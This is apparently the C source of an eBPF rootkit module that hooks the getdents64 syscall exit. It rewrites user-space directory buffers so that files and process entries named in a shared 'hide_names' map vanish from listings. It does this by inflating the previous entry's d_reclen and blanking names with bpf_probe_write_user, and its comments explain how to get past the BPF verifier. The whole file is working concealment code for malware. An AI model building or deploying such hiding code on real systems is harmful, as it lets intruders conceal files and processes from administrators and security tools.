// hide.c — process / file hiding via the getdents64 syscall (Phase 2a)
//
// Hook : tracepoint/syscalls/sys_exit_getdents64   (BPF_PROG_TYPE_TRACEPOINT)
// Maps : hide_names  (shared, declared in common.h — no extra maps)
//
// ---------------------------------------------------------------------------
// WHY THE ARGS COME FROM pt_regs AND NOT FROM THE TRACEPOINT RECORD
// ---------------------------------------------------------------------------
// The original spec assumed the syscall args survive to sys_exit as
// `args->args[0]` (fd) / `args->args[1]` (dirent buffer).  They do NOT.
// Verified against the live kernel:
//
//   $ cat /sys/kernel/tracing/events/syscalls/sys_exit_getdents64/format
//     field:int __syscall_nr;  offset:8;  size:4;
//     field:long ret;          offset:16; size:8;
//
// Only the *sys_enter* tracepoint records `unsigned long args[6]`; vmlinux.h
// mirrors this (struct trace_event_raw_sys_exit is {ent, id, ret} — there is
// no args[] member, and reading past `ret` would read unrelated ring-buffer
// bytes and then write to whatever garbage pointer came out).
//
// So we recover the ORIGINAL argument registers from the current task's
// pt_regs, which sit at the top of the task's kernel stack (task_pt_regs() on
// x86_64: task->stack + THREAD_SIZE - sizeof(struct pt_regs)).  At sys_exit
// time the kernel has only written `ax` (the return value) there; `di` and
// `si` still hold the entry values.  This was verified on the live kernel with
// a probe (ret=6872, di=3 (dirfd), si=<valid user dirent pointer>).
//
// This keeps the exact section name / program type from the spec and adds no
// maps, so the loader ABI (6 maps, indices 0..5) is untouched.
// ---------------------------------------------------------------------------

/* The build pipeline passes -D__VMLINUX_H__, which *defines* the include
 * guard that vmlinux.h itself uses — that would make the whole 149k-line
 * header a no-op and leave every struct undefined.  Undo it here so the
 * module compiles under the documented command line unmodified. */
#undef __VMLINUX_H__

#include "common.h"
#include <bpf/bpf_tracing.h>

/* x86_64: THREAD_SIZE = 4 pages.  task_pt_regs() = stack + THREAD_SIZE - 1
 * pt_regs; TOUCH_... KP_STACK_PADDING is 0 on x86_64. */
#define AX_THREAD_SIZE  16384UL

/* Bounded parse budget.  512 dirents covers a full 32 KiB getdents64 buffer
 * for anything but pathologically short names (min entry = 19 bytes). */
#define AX_DIR_MAX_ITER 512

/* hide_names key width (see common.h). */
#define AX_NAME_LEN     64

/* On-wire linux_dirent64 header.  Declared packed so sizeof() is the real
 * 19 bytes — the kernel's own struct linux_dirent64 has a trailing
 * `char d_name[0]` and would round up to 24 with padding. */
struct ax_dirent_hdr {
    __u64 d_ino;
    __s64 d_off;
    __u16 d_reclen;
    __u8  d_type;
} __attribute__((packed));

/* Address of the current task's pt_regs (top of its kernel stack). */
static __always_inline struct pt_regs *ax_task_pt_regs(void)
{
    struct task_struct *t = bpf_get_current_task_btf();
    void *stack = NULL;

    if (!t)
        return NULL;
    if (bpf_probe_read_kernel(&stack, sizeof(stack), &t->stack) != 0)
        return NULL;
    if (!stack)
        return NULL;
    return (struct pt_regs *)((char *)stack + AX_THREAD_SIZE) - 1;
}

/* Read the original syscall args: di = fd, si = dirent buffer. */
static __always_inline int ax_getdents_args(__u64 *fd, __u64 *buf)
{
    struct pt_regs *regs = ax_task_pt_regs();

    if (!regs)
        return -1;
    if (bpf_probe_read_kernel(fd, sizeof(*fd), &regs->di) != 0)
        return -1;
    if (bpf_probe_read_kernel(buf, sizeof(*buf), &regs->si) != 0)
        return -1;
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int ax_hide_getdents64(struct trace_event_raw_sys_exit *args)
{
    long ret = args->ret;
    __u64 fd = 0, buf = 0;
    __u64 off = 0, prev_off = 0;
    __u32 prev_reclen = 0;
    int have_prev = 0;
    char name[AX_NAME_LEN];
    char zeros[AX_NAME_LEN];
    int i;

    /* nothing read, or an error */
    if (ret <= 0)
        return 0;
    if (ax_getdents_args(&fd, &buf) != 0 || buf == 0)
        return 0;

    __builtin_memset(zeros, 0, sizeof(zeros));

    for (i = 0; i < AX_DIR_MAX_ITER; i++) {
        struct ax_dirent_hdr d;
        __u32 reclen, nlen, rd;

        if (off + sizeof(d) > (__u64)ret)
            break;
        if (bpf_probe_read_user(&d, sizeof(d), (void *)(buf + off)) != 0)
            break;

        reclen = d.d_reclen;
        /* reject malformed entries that would desync or overrun the count */
        if (reclen < sizeof(d) || off + reclen > (__u64)ret)
            break;

        /* Read the name, bounded by this entry's own reclen so we never read
         * past the last entry of the buffer.  The tail stays zero from the
         * memset, which gives the 64-byte map key strcmp semantics. */
        nlen = reclen - sizeof(d);
        rd = nlen > sizeof(name) ? sizeof(name) : nlen;
        if (rd == 0)
            break;
        /* Size arguments must be provably non-zero to the VERIFIER, and the
         * verifier only reads the instruction's tnum — it cannot use the
         * facts LLVM knows.  `(x - 1) & 63` has its top bits clear, so `+ 1`
         * leaves a tnum with value = 1, i.e. umin = 1, umax = 64, while
         * staying <= x (no overrun).  A plain `if (x == 0) x = 1;` is NOT
         * equivalent here: LLVM deletes it whenever it can prove x != 0 on
         * that path, and the call is then rejected with
         * "R<size> invalid zero-sized read: u64=[0,63]". */
        rd = ((rd - 1) & (AX_NAME_LEN - 1)) + 1;
        __builtin_memset(name, 0, sizeof(name));
        if (bpf_probe_read_user(name, rd, (void *)(buf + off + sizeof(d))) != 0)
            break;

        /* The kernel's filldir64 NUL-terminates the name in place and
         * d_reclen covers that terminator plus alignment padding, so reading
         * exactly nlen bytes into the zeroed buffer already gives the name
         * NUL-padded to the full 64-byte key — which is what a char[64] map
         * key needs ("ls\0\0\0..." rather than "ls\0<padding garbage>").
         *
         * Do NOT replace this with a byte-at-a-time scan for the first NUL:
         * an inner loop of AX_NAME_LEN iterations inside this 512-iteration
         * loop is exactly what made the verifier reject this program with
         * "BPF program is too large. Processed 1000001 insn" (total_states
         * 11056).  Reading the name in one bulk copy is both cheaper and
         * what the verifier can prune. */
        name[AX_NAME_LEN - 1] = 0;

        if (bpf_map_lookup_elem(&hide_names, name) != NULL) {
            /* Hidden.  Swallow the entry by inflating the PREVIOUS entry's
             * d_reclen over it; glibc walks with prev += d_reclen and stops
             * at `ret`, so the inflated length is exactly what we want. */
            if (have_prev) {
                __u32 newlen = prev_reclen + reclen;
                if (newlen <= 0xffff) {
                    __u16 w = (__u16)newlen;
                    bpf_probe_write_user((void *)(buf + prev_off + 16),
                                         &w, sizeof(w));
                    prev_reclen = newlen;
                }
            }
            /* Defence in depth: blank the name in place.  This is the only
             * action available when the hidden entry is the FIRST one (there
             * is no previous entry to inflate). */
            {
                /* never longer than the entry's own name field; nlen >= 1
                 * here because rd == 0 already broke out above */
                __u32 z = nlen > AX_NAME_LEN ? AX_NAME_LEN : nlen;

                z = ((z - 1) & (AX_NAME_LEN - 1)) + 1;   /* verifier-visible [1,64] */
                bpf_probe_write_user((void *)(buf + off + sizeof(d)),
                                     zeros, z);
            }
        } else {
            /* prev tracks the last NON-hidden entry seen */
            prev_off = off;
            prev_reclen = reclen;
            have_prev = 1;
        }

        off += reclen;
    }

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
